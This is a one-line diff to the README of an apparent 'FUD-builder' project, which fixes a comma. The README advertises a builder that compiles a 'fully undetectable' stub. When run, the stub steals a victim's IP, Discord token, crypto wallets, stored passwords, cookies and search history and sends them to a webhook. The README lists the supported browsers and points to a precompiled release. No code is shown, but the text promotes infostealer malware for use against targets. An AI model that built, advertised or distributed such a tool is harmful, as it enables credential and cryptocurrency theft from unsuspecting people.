@@ -1,7 +1,7 @@
 # FUD-builder
 You can find an already compiled version of the builder in the release tab on the right. Check the rel description for instructions. <br />
 This is a builder that will compile a fully undetectable stub. <br />
-When run the stub will grab and send to the webhook previously specified information about the target's IP, Discord Token, crypto wallets, stored passwords, cookies and search history.
+When run, the stub will grab and send to the webhook previously specified information about the target's IP, Discord Token, crypto wallets, stored passwords, cookies and search history.
 Supported browsers: <br />
 -Chrome <br />
 -Firefox <br />
